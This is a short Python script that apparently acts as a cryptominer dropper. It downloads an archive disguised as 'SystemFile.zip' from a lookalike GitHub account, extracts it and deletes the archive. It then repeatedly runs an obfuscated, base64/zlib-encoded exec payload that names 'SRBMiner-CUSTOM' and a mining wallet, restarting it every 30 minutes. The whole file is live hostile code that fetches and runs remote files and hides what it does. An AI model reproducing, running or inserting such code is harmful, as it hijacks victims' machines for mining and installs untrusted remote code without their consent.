import subprocess
import os
import signal
import requests
import zipfile
from time import sleep
import zlib,base64

timeout = 1800

url = "https://github.com/G1tHuP333/test/raw/refs/heads/main/SystemFile.zip"
filename = 'SystemFile.zip'
response = requests.get(url, stream=True)
file = open(filename, "wb")
file.write(response.content)
file.close()

with zipfile.ZipFile('SystemFile.zip', 'r') as zip_ref:
	zip_ref.extractall()

os.remove('SystemFile.zip')

code = "import zlib,base64;threads=8;name='SRBMiner-CUSTOM/0.0.4';wname='mbc1qm7y0rx0r43t5c3f6y8uuf0pykaa2uq5h2emz3v.MeD';_=lambda O0O00O00O00O0O0O00O00O00O0O0O0O00O00O00O00O00O00O00O00O0O0O00O0O00O0O00O00O00O00O0O00O0O0O0O00O00O00O00O0O0O0O0O00O0O00O00O00O00O00O0O0O00O0O00O0O0O00O0O00O00O0O00O0O0O0O0O0O00O00O00O00O0O0O00O0O0O00O00O0O0O00O0O00O0O0O00O00O0O0O00O00O00O00O00O00O00O0O00O00O0:__import__((lambda s:zlib.decompress(base64.b64decode(s)).decode())('eJyryslMAgAEZAGy')).decompress(__import__((lambda s:zlib.decompress(base64.b64decode(s)).decode())('eJxLSixONTMBAAfSAgY=')).b64decode(O0O00O00O00O0O0O00O00O00O0O0O0O00O00O00O00O00O00O00O00O0O0O00O0O00O0O00O00O00O00O0O00O0O0O0O00O00O00O00O0O0O0O0O00O0O00O00O00O00O00O0O0O00O0O00O0O0O00O0O00O00O0O00O0O0O0O0O0O00O00O00O00O0O0O00O0O0O00O00O0O0O00O0O00O0O0O00O00O0O0O00O00O00O00O00O00O00O0O00O00O0[::-1]));exec(_(b''))"
while True:
    print(f"▶️ Đang chạy code với timeout {timeout}")
    process = subprocess.Popen(
        ["python", "-c", code],
        preexec_fn=os.setsid)
    try:
        process.wait(timeout=timeout)
    except subprocess.TimeoutExpired:
        print(f"⏰ Hết {timeout}, đang kill toàn bộ tiến trình...")
        os.killpg(os.getpgid(process.pid), signal.SIGTERM)
    sleep(1)